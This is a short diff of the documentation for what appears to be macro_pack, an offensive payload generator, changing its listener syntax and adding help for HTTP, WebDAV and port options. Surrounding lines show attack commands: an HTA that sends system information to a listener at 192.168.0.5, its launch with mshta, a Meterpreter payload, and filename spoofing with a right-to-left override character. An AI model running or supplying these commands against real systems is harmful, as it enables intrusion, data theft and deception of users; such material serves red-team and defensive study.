@@ -209,7 +209,7 @@ set EnableStageEncoding true
 # 1 Generate HTA file with CMD template
 echo http://192.168.0.5:1234/a "systeminfo" | macro_pack.exe -t CMD -o -G info.hta
 # 2 On 192.168.0.5 open macro_pack as http listener
-macro_pack.exe -l 1234
+macro_pack.exe -l . --port=1234
 # 3 run hta file with mshta
 mshta.exe full/path/to/info.hta
 ```
@@ -335,6 +335,12 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
      --unicode-rtlo=SPOOF_EXTENSION Inject the unicode U+202E char (Right-To-Left Override) to spoof the file extension when view in explorers.
         Ex. To generate an hta file with spoofed jpg extension use options: -G something.hta --unicode-rtlo=jpg
         In this case, windows or linux explorers will show the file named as: somethingath.jpg 
+        
+    -l, --listen=ROOT_PATH \t Open an HTTP server from ROOT_PATH listening on default port 80.
+
+    -w, --webdav-listen=ROOT_PATH \tOpen a WebDAV server on default port 80, giving access to ROOT_PATH.
+    
+    --port=PORT \tSpecify the listening port for HTTP and WebDAV servers.
 
     -h, --help   Displays help and exit
            
